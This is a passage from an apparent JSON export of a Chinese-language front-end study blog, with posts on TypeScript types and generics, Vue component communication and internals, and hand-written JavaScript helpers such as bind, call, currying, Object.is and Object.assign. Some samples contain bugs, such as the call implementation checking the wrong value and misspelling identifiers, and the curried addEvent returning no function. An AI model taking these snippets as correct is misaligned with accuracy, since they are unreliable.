true];console.log(a.length); // (property) length: numbertype StringNumberPair = [string, number];const d: StringNumberPair = [&#x27;1&#x27;, 1];console.log(d.length); // (property) length: 2 参数列表使用元组： 123function readButtonInput(...args:[string,number,...boolean[]])&#123; const [name,version,...input]=args;&#125; 等同于： 123function readButtonInput(name:string,version:number,...input:boolean[])&#123; ...&#125; readonly元组 大部分代码中，元组只是被创建，使用后不会被修改，所以尽可能将元组设置为readonly是一个好习惯。 1234567let point=[3,4] as const;function distanceFromOrigin([x,y]:[number,number])&#123; return Math.sqrt(x**2+y**2);&#125;distanceFromOrigin(point);// Argument of type &#x27;readonly [3, 4]&#x27; is not assignable to parameter of type &#x27;[number, number]&#x27;.// The type &#x27;readonly [3, 4]&#x27; is &#x27;readonly&#x27; and cannot be assigned to the mutable type &#x27;[number, number]&#x27;. 尽管distanceFromOrigin并没有更改传入的元素，但函数希望传入一个可变元组，但是point的类型被推断为readonly[3,4],它跟[number,number]并不兼容，所以TypeScript给了一个报错 参考：https://ts.yayujs.com/handbook/TypeofTypeOperator.html https://www.typescriptlang.org/docs/handbook/2/typeof-types.html","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"函数","slug":"函数","date":"2022-07-03T03:53:45.000Z","updated":"2022-07-04T09:03:51.172Z","comments":true,"path":"2022/07/03/函数/","link":"","permalink":"https://coloey.github.io/2022/07/03/%E5%87%BD%E6%95%B0/","excerpt":"","text":"写一个好的泛型函数建议：类型参数下移：1234567891011function firstElemet1&lt;Type&gt;(arr:Type[])&#123; return arr[0];&#125;function firstElemet2&lt;Type extends any[]&gt;(arr:Type)&#123; return arr[0];&#125;//a:number(good)const a=firstElemet1([1,2,3])//b:any(bad)const b=firstElemet2([1,2,3]) 第一个函数可以推断出返回的类型是number,第二个函数推断出的返回类型却是any,因为TypeScript不得不用约束的类型来推断arr[0]表达式，而不是等到函数调用的时候再去推断这个元素。 push down就是如果超类中的某个函数只与一个或者少数几个子类有关，那么最好将其从超类中挪走，放到真正关心它的子类中，即只在超类保留共用的行为，这种将超类中的函数本体复制到具体需要的子类的方法称为”push down”,与本节中的去除extend any[],将其具体的推断交给Type自身就类似于push down. 注意：如果可能，直接使用类型参数而不是约束它 使用更少的类型参数12345678910function filter1&lt;Type&gt;(arr: Type[], func: (arg: Type) =&gt; boolean): Type[] &#123; return arr.filter(func);&#125; function filter2&lt;Type, Func extends (arg: Type) =&gt; boolean&gt;( arr: Type[], func: Func): Type[] &#123; return arr.filter(func);&#125; 我们创建了一个并没有关联两个值的类型参数Func,这是一个危险信号，因为它意味着调用者不得不毫无理由的手动指定一个额外的类型参数，Func什么也没做，却导致函数更难阅读和推断 ！尽可能使用更少的类型参数 类型参数应该出现两次有的时候一个函数其实并不需要泛型 1234function greet&lt;Str extends string&gt;(s:Str)&#123; console.log(&quot;Hello,&quot;+s);&#125;greet(&quot;world&quot;); 类型参数时用来关联多个值之间的类型，如果一个类型参数只在函数签名里出现了一次，那它就没有跟任何东西产生关联 1234function greet(s:string)&#123; console.log(&quot;Hello,&quot;+s);&#125; 在函数中声明this TypeScript会通过代码流反洗函数中的this会是什么类型 1234567const user=&#123; id:124, admin:false, becomeAdmin:function()&#123; this.admin=true; &#125;&#125; TypeScript能够理解函数user.becomeAdmin中的this指向的是外层的对象user,在Js中,this是保留字，不能当做参数使用，但TypeScript可以允许你在函数体内声明this的类型 1234567interface DB&#123; filterUsers(filters:(this:User)=&gt;boolean):User[];&#125;const db=getDB();const admins=db.filterUsers(function(this:User)&#123; return this.admin;&#125;) function的形式不能使用箭头函数 12345678interface DB &#123; filterUsers(filter: (this: User) =&gt; boolean): User[];&#125; const db = getDB();const admins = db.filterUsers(() =&gt; this.admin);// The containing arrow function captures the global value of &#x27;this&#x27;.// Element implicitly has an &#x27;any&#x27; type because type &#x27;typeof globalThis&#x27; has no index signature. 函数的可赋值性:返回void当基于上下文的类型推导推导出返回类型为void的时候，并不会强制函数一定不能返回内容，换句话说，如果一个返回void类型的函数类型(type vf=()=&gt;void)，当被应用时，也是可以返回任何值的，但返回的值会被忽略，在TS里，子类型的值可以赋值给父类型的变量，在这里，我们可以认为void类型比具体的一些类型，比如number,string类型之类的，更宽泛，因此可以接受这些具体类型。 虽然可以赋值，但是执行函数后返回值的类型，却是void的，并不是实际的真实类型，参考下面的f1变量，它并不是boolean类型，不能访问boolean类型的属性。void类型的用法，主要用在我们不希望调用者关心函数返回值的情况下，比如通常的异步回调函数，这种情况下返回值时没有意义的 1234567891011type voidFunc = () =&gt; void; const f1: voidFunc = () =&gt; &#123; return true;&#125;; const f2: voidFunc = () =&gt; true; const f3: voidFunc = function () &#123; return true;&#125;; 而且即便这些函数的返回值赋值给其他变量，也会维持void类型 123const v1=f1();const v2=f2();const v3=f3(); 因此，以下代码有效： 123const src=[1,2,3];const dst=[0];src.forEach((el)=&gt;dst.push(el)); 尽管Array.prototype.push返回一个数字，并且Array.prototype.forEach方法期待一个返回void类型的函数，但这段代码依然没有报错，就是因为基于上下文 推导，推导出forEach函数返回类型为void,正是因为不强制函数一定不能返回内容，所有上面这种return dst.push(el)的写法不报错 当一个函数字面量定义返回一个void类型，函数一定不能返回任何东西 123456789function f2(): void &#123; // @ts-expect-error return true;&#125; const f3 = function (): void &#123; // @ts-expect-error return true;&#125;; 具体参考： https://ts.yayujs.com/handbook/MoreOnFunctions.html#%E5%87%BD%E6%95%B0-more-on-functions https://www.typescriptlang.org/docs/handbook/2/functions.html","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"手写bind","slug":"手写bind","date":"2022-07-02T16:17:34.000Z","updated":"2022-07-03T02:18:18.648Z","comments":true,"path":"2022/07/03/手写bind/","link":"","permalink":"https://coloey.github.io/2022/07/03/%E6%89%8B%E5%86%99bind/","excerpt":"","text":"12345678910111213141516Function.prototype.bind=function(context)&#123; if(typeof this !==&#x27;function&#x27;)&#123; throw new Error(&quot;Function .prototype.bind-what is trying to be bound is not callable&quot;) &#125; var self=this; var args=Array.prototype.slice.call(arguments,1); var fNOP=function()&#123;&#125;; var fBound=function()&#123; var bindArgs=Array.prototype.slice.call(arguments); return self.apply(this instanceof fNOP?this:context,args.concat(bindArgs)); &#125; fNOP.prototype=this.prototype; fBound.prototype=new fNOP(); return fBound; &#125; 参考： []: https://github.com/mqyqingfeng/Blog/issues/12","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"基础类型","slug":"基础类型","date":"2022-06-29T15:11:49.000Z","updated":"2022-06-29T17:01:15.228Z","comments":true,"path":"2022/06/29/基础类型/","link":"","permalink":"https://coloey.github.io/2022/06/29/%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"布尔值：1let isdone:boolean=false; 数字：TypeScript里的所有数字都是浮点数。 这些浮点数的类型是number。 除了支持十进制和十六进制字面量，TypeScript还支持ECMAScript 2015中引入的二进制和八进制字面量。 1234let decLiteral:number =6;let hexLiteral:number=0xf00d;let binaryLiteral:number=0b1010;let octalLiteral:number=0o744 字符串:123let name:string=&quot;bob&quot;;name=&quot;smith&quot;;let name:string=`Gene`; 数组： 在元素类型后面接上[],表示由此类型元素组成一个数组 1let list: number[]=[1,2,3]; 2.数组泛型,Array&lt;元素类型&gt; 1let list:Array&lt;number&gt;=[1,2,3]; 元组Tuple:元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。 比如，你可以定义一对值分别为string和number类型的元组 123let x:[string,number];x=[&#x27;hello&#x27;,10];//OK 12console.log(x[0].substr(1));//OKconsole.log(x[1].substr(1));//Error,&#x27;number&#x27; does not have &#x27;substr&#x27; 当访问一个越界元素，会使用联合类型替代 123x[3]=&quot;world&quot;;//字符串乐意赋值给(string|number)类型console.log(x[5].toString());//&#x27;string&#x27;和&#x27;number&#x27;都有toStringx[6]=true;//Error,布尔不是(string|number)类型 枚举enum类型是对JavaScript标准类型数据的一个补充，像C#等其他语言一样，使用枚举类型可以为一组数值赋予友好的名字 12enum Color &#123;Red,Green,Blue&#125;let c:Color=Color.Green; 任意值有时候，我们会想要为那些在编程阶段还不清楚类型的变量指定一个类型，这些值可能来自于动态的内容，比如来自用户输入或第三方代码库。这种情况下，我们不希望类型检查器对这些值进行检查而是直接让它们通过编译阶段的检查。那么我们可以使用any类型来标记这些变量： 123let notSure:any=4;notSure=&quot;maybe a string instead&quot;;notSure=false;//ok,definitely a boolean 在对现有代码进行改写的时候，any类型是十分有用的，它允许你在编译时可选择地包含或移除类型检查。 你可能认为Object有相似的作用，就像它在其它语言中那样。 但是Object类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法： 12345let notSure:any=4;notSure.ifItExists();//ok,ifItExists might exist at runtimenotSure.toFixed();//okay, toFixed exists (but the compiler doesn&#x27;t check)let prettySure:Object=4;prettySure.toFixed();//Error:Property &#x27;toFixed&#x27; doesn&#x27;t exist on type &#x27;object&#x27; 当你知道一部分数据的类型时，any类型也是有用的，比如，有一个数组，它包含了不同类型的数据： 12let list:any[]=[1,true,&quot;free&quot;];list[1]=100; 空值某种程度上来说，void类型像是与any类型相反，它表示没有任何类型，当一个函数没有返回值时，你通常会见到其返回值类型时void 123function warnUser:void&#123; alert(&quot;This is my warning message&quot;)&#125; 声明一个void类型的变量没有什么大用，因为你只能它赋予undefined和null 1let unusable:void=undefined Null和Undefinedundefined和null两者各有自己的类型分别叫做undefined和null,和void相似，它们的本身的类型用处不大 12let u:undefined=undefined;let n:null=null; 默认情况下null和undefined实所有类型的子类型，就是说你可以把null和undefined赋值给number类型的变量 然而，当你指定了–strictNullChecks标记，null和undefined只能赋值给void和它们各自，这能避免很多常见的问题，也许在某处你想传入一个string或null或undefined，你可以使用联合类型string | null | undefined。 Nervernerver类型表示的是那些永不存在的值的类型。例如，nerver类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；变量也可能是nerver类型，当它们被永不为真的类型保护锁约束时。nerver类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是nerver的子类型或可以赋值给nerver类型，即使any也不可以赋值给nerver 123456789101112131415// 返回never的函数必须存在无法达到的终点function error(message: string): never &#123; throw new Error(message);&#125;// 推断的返回值类型为neverfunction fail() &#123; return error(&quot;Something failed&quot;);&#125;// 返回never的函数必须存在无法达到的终点function infiniteLoop(): never &#123; while (true) &#123; &#125;&#125; 类型断言：1.尖括号语法 12let someValue:any=&quot;this is a string&quot;;let strlength:number=(&lt;string&gt;someValue).length; 2.as语法 12let someValue:any=&quot;this is a string&quot;；let strLength:number=(someValue as string).length;","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"判断数组类型","slug":"判断数组类型","date":"2022-05-31T11:24:58.000Z","updated":"2022-05-31T11:43:40.007Z","comments":true,"path":"2022/05/31/判断数组类型/","link":"","permalink":"https://coloey.github.io/2022/05/31/%E5%88%A4%E6%96%AD%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"instanceof12let arr=[1,2,3]console.log(arr instanceof Array) 变量.constructor===变量类型12let arr=[1,2,3]console.log(arr.constructor===Array) Array.isArray(变量)12let arr=[1,2,3]console.log(Array.isArray(arr)) Object.prototype.toString.call(),返回true则变量时数组类型12let arr=[1,2,3]console.log(Object.prototype.toString.call(arr)===&#x27;[object Array]&#x27;) 判断对象原型12let arr=[1,2,3]console.log(arr.__proto__===Array.prototype) Object.getPrototypeOf()来判断是否为数组类型12let arr=[1,2,3]console.log(Object.getPrototypeOf(arr)===Array.prototype);//true isPrototypeOf()判断是否为数组类型12let arr=[1,2,3]console.log(Array.prototype.isPrototypeOf(arr))","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Vue中组件通信","slug":"Vue中组件通信","date":"2022-05-29T10:15:22.000Z","updated":"2022-05-29T11:15:11.347Z","comments":true,"path":"2022/05/29/Vue中组件通信/","link":"","permalink":"https://coloey.github.io/2022/05/29/Vue%E4%B8%AD%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/","excerpt":"","text":"父子组件之间通信 兄弟组件之间的通信 祖孙与后代组件之间的通信 非关系组件间的通信 整理vue中8种常规的通信方案 通过 props 传递 通过 $emit 触发自定义事件 使用 ref EventBus $parent 或$root attrs 与 listeners Provide 与 Inject Vuex 组件通信方案： 通过props传递 通过$emit触发自定义事件 使用ref EventBus $parent或$root attrs与listeners Provide与inject Vuex props传递数据 适用场景：父组件传递数据给子组件 子组件设置props属性，定义接收父组件传递过来的参数 父组件在使用子组件标签中通过字面量来传递值 Children.vue 12345678910props:&#123; //字符串形式 name:String//接收的类型参数 //对象形式 age:&#123; type:Number,//接收的类型为数值 default:18;//默认值为18 require:true;//age属性必须传递 &#125;&#125; Father.vue 1&lt;Children name=&#x27;jack&#x27; age=18/&gt; $emit触发自定义事件 适用场景：子组件传递数据给父组件 子组件通过$emit触发自定义事件，$emit第二个参数为传递的数值 父组件绑定监听器获取子组件传递过来的参数 与组件和 prop 一样，事件名提供了自动的大小写转换。如果在子组件中触发一个以 camelCase (驼峰式命名) 命名的事件，你将可以在父组件中添加一个 kebab-case (短横线分隔命名) 的监听器。 Children.vue methods中 1this.$emit(&#x27;add&#x27;,good) Father.vue template中： 1&lt;Children @add=&quot;cartAdd($event)&quot; ref 父组件在使用子组件的时候设置ref 父组件通过这只子组件ref来获取数据 父组件 12&lt;Children ref=&#x27;foo&#x27;/&gt; this.$refs.foo//获取子组件实例，通过子组件实例我们可以拿到对应数据 EventBus 使用场景：兄弟组件传值 创建一个中央事件总线EventBus 兄弟组件通过$emit触发自定义事件，$emit第二个参数为传递的数值 另一个兄弟组件通过$on监听自定义事件 Bus.js 12345678910111213141516171819202122232425262728class Bus&#123; constructor()&#123; this.events=&#123;&#125;; &#125; on(event,fn)&#123; this.events[event]=this.events[event]||[]; this.events[event].push(fn) &#125; emit(event,data)&#123; if(this.events[event])&#123; this.events[event].forEach(cb=&gt;&#123; cb(data) &#125;) &#125; &#125; off(event,fn)&#123; if(this.events[event])&#123; for(let i=0;i&lt;this.events[event].length;i++)&#123; if(this.events[event][i]===fn)&#123; this.events[event].splice(i,1); break; &#125; &#125; &#125; &#125;&#125; 在入口中执行挂载 1234567891011//main.jsimport &#123;createApp&#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;//引入事件类import EventBus from &#x27;lib/Bus.js&#x27;const $bus=new Bus()//挂载//1使用provideapp.provide(&#x27;$bus&#x27;,$bus);//2 挂载到this上app.config.globalProperties.$bus=$bus 在组件中引入并使用 12345export default&#123; created()&#123; this.$bus.emit(&#x27;ButtonCreated&#x27;) &#125;&#125; 在setup中使用 setup中无法访问到应用实例的this,所以用provide/inject 12345678import &#123;inject&#125; from &#x27;vue&#x27;export default &#123; setup()&#123; const $bus=inject(&#x27;$bus&#x27;) $bus.emit(&#x27;ButtonSetup&#x27;) &#125;&#125; $parent或$root通过共同父辈$parent或者$root搭建通信桥梁 兄弟组件 this.$parent.on(‘add’,this.add); 另一个兄弟组件 this.$parent.emit(‘add’) $attrs 与$ listeners 适用场景：祖先传递数据给子孙 设置批量向下传属性$attrs和 $listeners 包含了父级作用域中不作为 prop 被识别 (且获取) 的特性绑定 ( class 和 style 除外)。 可以通过 v-bind=&quot;$attrs&quot; 传⼊内部组件 在vue2.4中，为了解决该需求，引入了$attrs和$listeners，新增了inheritAttrs选项。我们只需要在B组件中对引入的C组件增加下面两个属性即可绑定所有的属性和事件。 12&lt;C v-bind=&quot;$attrs&quot; v-on=&quot;$listeners&quot;&gt;&lt;/C&gt; A组件 1234567891011121314151617181920212223&lt;template&gt;&lt;div&gt; &lt;h2&gt;组件A 数据项:&#123;&#123;myData&#125;&#125;&lt;/h2&gt; &lt;B @changeMyData=&quot;changeMyData&quot; :myData=&quot;myData&quot;&gt;&lt;/B&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import B from &quot;./B&quot;;export default &#123; data() &#123; return &#123; myData: &quot;100&quot; &#125;; &#125;, components: &#123; B &#125;, methods: &#123; changeMyData(val) &#123; this.myData = val; &#125; &#125;&#125;;&lt;/script&gt; B组件 1234567891011121314&lt;template&gt; &lt;div&gt; &lt;h3&gt;组件B&lt;/h3&gt; &lt;C v-bind=&quot;$attrs&quot; v-on=&quot;$listeners&quot;&gt;&lt;/C&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import C from &quot;./C&quot;;export default &#123; components: &#123; C &#125;,&#125;;&lt;/script&gt; C组件 12345678910111213141516171819202122&lt;template&gt; &lt;div&gt; &lt;h5&gt;组件C&lt;/h5&gt; &lt;input v-model=&quot;myc&quot; @input=&quot;hInput&quot; /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; props: &#123; myData: &#123; String &#125; &#125;, created() &#123; this.myc = this.myData; // 在组件A中传递过来的属性 console.info(this.$attrs, this.$listeners); &#125;, methods: &#123; hInput() &#123; this.$emit(&quot;changeMyData&quot;, this.myc); // // 在组件A中传递过来的事件 &#125; &#125;&#125;;&lt;/script&gt; 参考：https://juejin.cn/post/6844903828098138120 provide与inject 在祖先组件定义provide属性，并返回传递的值 在后代组件通过inject接收组件传递过来的值 祖先组件： 123456provide()&#123; return &#123; foo:&#x27;foo&#x27; &#125;&#125; 后代组件： 1inject:[&#x27;foo&#x27;];//获取到祖先组件传递过来的值 具体：https://v3.cn.vuejs.org/guide/component-provide-inject.html#%E5%A4%84%E7%90%86%E5%93%8D%E5%BA%94%E6%80%A7 Vuex 适用场景: 复杂关系的组件数据传递 Vuex作用相当于一个用来存储共享变量的容器 state用来存放共享变量的地方 getter，可以增加一个getter派生状态，(相当于store中的计算属性），用来获得共享变量的值 mutations用来存放修改state的方法。 actions也是用来存放修改state的方法，不过action是在mutations的基础上进行。常用来做一些异步操作 #小结 父子关系的组件数据传递选择 props 与 $emit进行传递，也可选择ref 兄弟关系的组件数据传递可选择$bus，其次可以选择$parent进行传递 祖先与后代组件数据传递可选择attrs与listeners或者 Provide与 Inject 复杂关系的组件数据传递可以通过vuex存放共享的变量","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"为什么data属性是一个函数而不是一个对象","slug":"为什么data属性时一个函数而不是一个对象","date":"2022-05-29T09:08:36.000Z","updated":"2022-05-29T09:23:15.249Z","comments":true,"path":"2022/05/29/为什么data属性时一个函数而不是一个对象/","link":"","permalink":"https://coloey.github.io/2022/05/29/%E4%B8%BA%E4%BB%80%E4%B9%88data%E5%B1%9E%E6%80%A7%E6%97%B6%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E8%80%8C%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1/","excerpt":"","text":"组件data定义函数与对象的区别在我们定义好一个组件的时候，vue最终都会通过Vue.extend()构成组件实例 123456function Component()&#123; &#125;Component.prototype.data=&#123; count:0&#125; 创建两个组件实例： 12345const componentA=new Component()const componentB=new Component();console.log(componentB.data.count);//0componentA.data.count=1;console.log(componentB.data.count)//1 产生这样的原因是两者共用了同一个内存地址，compoentA修改的内容，同样对componentB产生了影响 如果采用函数形式，则不会出现这种情况（函数返回的对象内存地址并不相同） 12345678function Component()&#123; this.data = this.data()&#125;Component.prototype.data = function ()&#123; return &#123; count : 0 &#125;&#125; 1234console.log(componentB.data.count) // 0componentA.data.count = 1console.log(componentB.data.count) // 0 vue组件可能有多个实例，采用函数返回一个全新data形式，使每个实例对象的数据不会受到其他实例对象数据的污染 原理：vue初始化data的代码时，data的定义可以是函数或者对象 1234567function initData (vm: Component) &#123; let data = vm.$options.data data = vm._data = typeof data === &#x27;function&#x27; ? getData(data, vm) : data || &#123;&#125; ...&#125; 但是组件在创建的时候，会进行选项的合并，自定义组件会进入mergeOptions进行选择合并 1234567891011121314151617Vue.prototype._init = function (options?: Object) &#123; ... // merge options if (options &amp;&amp; options._isComponent) &#123; // optimize internal component instantiation // since dynamic options merging is pretty slow, and none of the // internal component options needs special treatment. initInternalComponent(vm, options) &#125; else &#123; vm.$options = mergeOptions( resolveConstructorOptions(vm.constructor), options || &#123;&#125;, vm ) &#125; ... &#125; 定义data会进行数据校验 这时候vm实例为undefined，进入if判断，若data类型不是function，则出现警告提示 123456789101112131415161718192021strats.data = function ( parentVal: any, childVal: any, vm?: Component): ?Function &#123; if (!vm) &#123; if (childVal &amp;&amp; typeof childVal !== &quot;function&quot;) &#123; process.env.NODE_ENV !== &quot;production&quot; &amp;&amp; warn( &#x27;The &quot;data&quot; option should be a function &#x27; + &quot;that returns a per-instance value in component &quot; + &quot;definitions.&quot;, vm ); return parentVal; &#125; return mergeDataOrFn(parentVal, childVal); &#125; return mergeDataOrFn(parentVal, childVal, vm);&#125;; 总结： 根实例对象data可以是对象也可以是函数（根实例是单例），不会产生数据污染情况 组件实例对象data必须是函数，目的是为了防止多个组件实例对象之间共用一个data,产生数据污染，采用函数的形式,initData时会将其作为工厂函数返回全新data对象","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Vue实例挂载发生了什么","slug":"Vue实例挂载发生了什么","date":"2022-05-29T08:33:28.000Z","updated":"2022-05-29T09:08:01.362Z","comments":true,"path":"2022/05/29/Vue实例挂载发生了什么/","link":"","permalink":"https://coloey.github.io/2022/05/29/Vue%E5%AE%9E%E4%BE%8B%E6%8C%82%E8%BD%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/","excerpt":"","text":"new Vue 的时候调用_init方法 定义$set,$get,$delete,$watch等方法 定义$on,$off,$emit等事件 定义_update,$forceUpdate,$destroy生命周期 调用$mount进行页面的挂载，会解析template: 将html文档解析后生成ast抽象语法树 将ast解析成字符串 生成render函数，挂载到vm上后，会再次调用mount方法 mount方法中 会调用mountComponent渲染组件 执行beforeMount钩子 定义updateComponent渲染页面视图方法（updateComponent方法主要执行在vue初始化声明的render,update方法，render的作用是生成vnode) 监听组件数据，一旦发生变化，触发beforeUpdate生命钩子 _update主要功能是调用patch,将vnode转换为真实DOM,并且更新到页面中 参考链接： https://vue3js.cn/interview/vue/new_vue.html#%E4%B8%89%E3%80%81%E7%BB%93%E8%AE%BA","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"git commit规范","slug":"git-commit规范","date":"2022-05-27T14:18:46.000Z","updated":"2022-05-27T14:18:46.340Z","comments":true,"path":"2022/05/27/git-commit规范/","link":"","permalink":"https://coloey.github.io/2022/05/27/git-commit%E8%A7%84%E8%8C%83/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"函数柯里化","slug":"函数柯里化","date":"2022-05-26T08:37:28.000Z","updated":"2022-05-29T07:44:27.981Z","comments":true,"path":"2022/05/26/函数柯里化/","link":"","permalink":"https://coloey.github.io/2022/05/26/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96/","excerpt":"","text":"柯里化：把接受多个参数的函数变换成接收一个单一参数（最初函数的第一个参数）的函数，并且返回接收余下的参数而且返回结果的新函数的技术 柯里化的通用实现方法：123456789101112const curry=(fn,...args)=&gt;&#123; return args.length&lt;fn.length//函数参数个数可以通过函数.length属性访问， ?(..._args)=&gt;curry(fn,...args,..._args)//传入参数小于原始函数fn参数的个数时，继续对当前函数进行柯里化，返回一个接受所有参数（当前参数和剩余参数）的函数 :fn(...args)//否则直接执行函数&#125;function add1(a,b,c,d)&#123; return a+b+c+d;&#125;var add=curry(add1)console.log(add(1,2,3,4))//10console.log(add(1)(2)(3)(4));//10console.log(add(1,2)(3,4));//10 柯里化的作用：参数复用1234567891011121314151617181920212223// 正常正则验证字符串 reg.test(txt)// 函数封装后function check(reg, txt) &#123; return reg.test(txt)&#125;check(/\\d+/g, &#x27;test&#x27;) //falsecheck(/[a-z]+/g, &#x27;test&#x27;) //true// Currying后function curryingCheck(reg) &#123; return function(txt) &#123; return reg.test(txt) &#125;&#125;var hasNumber = curryingCheck(/\\d+/g)var hasLetter = curryingCheck(/[a-z]+/g)hasNumber(&#x27;test1&#x27;) // truehasNumber(&#x27;testtest&#x27;) // falsehasLetter(&#x27;21212&#x27;) // false 第一个参数reg进行了复用 提前返回举个例子，兼容现代浏览器以及IE浏览器的事件添加方法，我们正常情况可能这样写： 123456789101112var addEvent=function(el,type,fn,capture)&#123; if(window.addEventListener)&#123; el.addEventListener(type,function(e)&#123; fn.call(el,e); &#125;,capture); &#125; else if(window.attachEvent)&#123; el.attachEvent(&quot;on&quot;+type,function(e)&#123; fn.call(el,e); &#125;) &#125;&#125; 上面的方法我们每次使用addEvent为元素添加事件的时候，都会走一遍if…else if…，其实只要判断一次，用柯里化 123456789101112var addEvent=(function()&#123; if(window.addEventListener)&#123; el.addEventListener(type,function(e)&#123; fn.call(el,e); &#125;,capture); &#125; else if(window.attachEvent)&#123; el.attachEvent(&quot;on&quot;+type,function(e)&#123; fn.call(el,e); &#125;) &#125;&#125;)(); 延迟执行比如bind方法的实现机制就是柯里化： 1234567Function.prototype.bind=function(context)&#123; var self=this; var args=Array.prototype.slice.call(arguments,1); return funtion()&#123; return self.apply(context,args); &#125;&#125; 参考文章： https://juejin.cn/post/6844904093467541517 https://www.zhangxinxu.com/wordpress/2013/02/js-currying/ https://www.jianshu.com/p/2975c25e4d71","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"}]},{"title":"手写Object.is","slug":"手写Object-is","date":"2022-05-24T08:23:28.000Z","updated":"2022-05-29T07:46:09.603Z","comments":true,"path":"2022/05/24/手写Object-is/","link":"","permalink":"https://coloey.github.io/2022/05/24/%E6%89%8B%E5%86%99Object-is/","excerpt":"","text":"1234567891011is=function(x,y)&#123; if(x===y)&#123;//如果x===y并且+0和-0=&gt;+0!==0false -0!==0false 1/+0===1/-0false返回false return x!==0||y!==0||1/x===1/y &#125;else&#123; //解决NaN===NaN为false,NaN!==NaNtrue NaN!==NaN true 返回true return x!==x&amp;&amp;y!==y; &#125;&#125;console.log(is(0,0))//trueconsole.log(is(+0,-0))//falseconsole.log(is(NaN,NaN))//true","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"}]},{"title":"手写object.assign","slug":"手写object-assign","date":"2022-05-24T07:48:46.000Z","updated":"2022-05-29T07:45:21.786Z","comments":true,"path":"2022/05/24/手写object-assign/","link":"","permalink":"https://coloey.github.io/2022/05/24/%E6%89%8B%E5%86%99object-assign/","excerpt":"","text":"12345678910111213141516171819202122232425Object.defineProperty(Object,&#x27;assign&#x27;,&#123; value: function (target,...args)&#123; if(target===null)return new TypeError(&quot;Can&#x27;t convert null or undefined to object&quot;) //目标对象统一为引用数据类型 const to=Object(target); for(let i=0;i&lt;args.length;i++)&#123; //每一个源对象 const nextSource=args[i]; if(nextSource!==null)&#123; //使用for...in 和hasOwnProperty双重判断，确保只拿到本身的属性，方法（不包含继承的) for(const nextKey in nextSource)&#123; if(Object.prototype.hasOwnProperty.call(nextSource,nextKey))&#123; to[nextKey]=nextSource[nextKey]; &#125; &#125; &#125; &#125; return to; &#125;, //不可枚举 enumerable:false, writable:true, configurable:true &#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"}]},{"title":"手写call","slug":"手写call","date":"2022-05-24T07:06:30.000Z","updated":"2022-05-29T07:44:56.470Z","comments":true,"path":"2022/05/24/手写call/","link":"","permalink":"https://coloey.github.io/2022/05/24/%E6%89%8B%E5%86%99call/","excerpt":"","text":"1234567891011Function.prototype._call=function(context=window,...args)&#123;//如果没有传入对象，则会默认this指向window if(typeOf context !==&#x27;function&#x27;)&#123; throw Error(&#x27;Type Error&#x27;) &#125; const fn=Symbol(&#x27;thisObj&#x27;); context[fn]=this;//给目标对象增加一个属性，并且将this赋给该属性 let res=context[fn](ars);//通过临时属性调用该函数并返回结果 delete context[fn];//删除该临时属性 return res; 